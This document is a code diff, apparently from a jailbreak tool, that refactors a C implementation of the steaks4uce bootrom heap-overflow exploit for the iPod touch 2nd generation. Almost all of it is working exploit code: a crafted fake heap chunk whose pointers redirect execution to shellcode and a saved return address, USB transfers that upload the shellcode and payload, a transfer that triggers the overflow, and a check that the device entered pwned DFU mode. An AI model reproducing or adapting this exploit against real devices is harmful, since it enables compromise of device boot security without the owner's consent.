@@ -2,7 +2,6 @@
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <assert.h>
 
 #include "steaks4uce.h"
 #include <libirecovery.h>
@@ -78,36 +77,38 @@ int prepare_shellcode(const char* srtg) {
 
     for (int i = 0; i < NUM_CONSTANTS; i++) {
         uint32_t *ptr = (uint32_t*)(steaks4uce_shellcode + const_offset + 4 * i);
-        assert(*ptr == (0xBAD00001 + i));
+        if (*ptr != (0xBAD00001 + i)) {
+            fprintf(stderr, "ERROR: Placeholder mismatch at index %d (expected 0x%08x, found 0x%08x)\n", i, *ptr, 0xBAD00001 + i);
+            return -1;
+        }
         *ptr = constants[i];
     }
 
     return 0;
 }
 
-unsigned char payload[0x138] = {0};
+const uint32_t payload_data[] = {
+          0x84, // 0x00: previous_chunk
+          0x05, // 0x04: next_chunk
+          0x80, // 0x08: buffer[0] - direction
+    0x22026280, // 0x0c: buffer[1] - usb_response_buffer
+    0xFFFFFFFF, // 0x10: buffer[2]
+         0x138, // 0x14: buffer[3] - size of payload in bytes
+         0x100, // 0x18: buffer[4]
+           0x0, // 0x1c: buffer[5]
+           0x0, // 0x20: buffer[6]
+           0x0, // 0x24: unused
+          0x15, // 0x28: previous_chunk (fake free chunk)
+           0x2, // 0x2c: next_chunk
+    0x22000001, // 0x30: fd - shellcode_address
+    0x2202D7FC  // 0x34: bk - LR on the stack
+};
 
 int main() {
-    irecv_error_t error = IRECV_E_SUCCESS;
     int ret;
 
-    uint32_t data[] = {
-        0x84,           // 0x00: previous_chunk
-        0x05,           // 0x04: next_chunk
-        0x80,           // 0x08: buffer[0] - direction
-        0x22026280,     // 0x0c: buffer[1] - usb_response_buffer
-        0xFFFFFFFF,     // 0x10: buffer[2]
-        0x138,          // 0x14: buffer[3] - size of payload in bytes
-        0x100,          // 0x18: buffer[4]
-        0x0,            // 0x1c: buffer[5]
-        0x0,            // 0x20: buffer[6]
-        0x0,            // 0x24: unused
-        0x15,           // 0x28: previous_chunk (fake free chunk)
-        0x2,            // 0x2c: next_chunk
-        0x22000001,     // 0x30: fd - shellcode_address
-        0x2202D7FC      // 0x34: bk - LR on the stack
-    };
-    memcpy(payload + 0x100, data, sizeof(data));
+    unsigned char payload[0x138] = {0};
+    memcpy(payload + 0x100, payload_data, sizeof(payload_data));
 
     printf("*** based on steaks4uce exploit (heap overflow) by pod2g ***\n");
 
@@ -120,7 +121,7 @@ int main() {
 
     const struct irecv_device_info *devinfo = irecv_get_device_info(client);
     if (devinfo->cpid != 0x8720) {
-        printf("ERROR: Device is not an iPod touch 2nd generation.\n");
+        fprintf(stderr, "ERROR: Device is not an iPod touch 2nd generation (CPID: %#x)\n", devinfo->cpid);
         return -1;
     }
     char* p = strstr(devinfo->serial_string, "PWND:[");
@@ -134,26 +135,28 @@ int main() {
     printf("Resetting USB counters.\n");
     ret = irecv_reset_counters(client);
     if (ret < 0) {
-        printf("ERROR: Failed to reset USB counters.\n");
+        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
         return -1;
     }
 
-    printf("Uploading patched shellcode for %s: %#x of data\n", devinfo->srtg, steaks4uce_shellcode_len);
+    printf("Uploading patched shellcode for %s: %#zx of data\n", devinfo->srtg, (size_t)steaks4uce_shellcode_len);
     ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, steaks4uce_shellcode, steaks4uce_shellcode_len, 5000);
     if (ret < 0) {
-        printf("ERROR: Failed to send steaks4uce to the device.\n");
+        fprintf(stderr, "ERROR: Failed to send steaks4uce to the device.\n");
         return -1;
     }
 
     printf("Uploading payload: %#zx of data\n", sizeof(payload));
     ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, payload, sizeof(payload), 5000);
     if (ret < 0) {
-        printf("ERROR: Failed to upload payload.\n");
+        fprintf(stderr, "ERROR: Failed to upload payload.\n");
         return -1;
     }
+
+    printf("Triggering the exploit.\n");
     ret = irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, payload, sizeof(payload), 1000);
     if (ret != sizeof(payload)) {
-        printf("ERROR: Failed to execute steaks4uce.\n");
+        fprintf(stderr, "ERROR: Failed to execute steaks4uce.\n");
         return -1;
     }
 
@@ -162,18 +165,22 @@ int main() {
 
     printf("Acquiring device handle.\n");
     err = irecv_open_with_ecid(&client, 0);
+    if (err != IRECV_E_SUCCESS) {
+        fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
+        return -1;
+    }
 
     printf("Reconnecting to device.\n");
     client = irecv_reconnect(client, 2);
     if (client == NULL) {
-        printf("ERROR: Unable to reconnect to device.\n");
+        fprintf(stderr, "ERROR: Unable to reconnect to device.\n");
         return -1;
     }
 
     devinfo = irecv_get_device_info(client);
     p = strstr(devinfo->serial_string, "PWND:[");
     if (!p) {
-        printf("ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
+        fprintf(stderr, "ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
         return -1;
     }
 
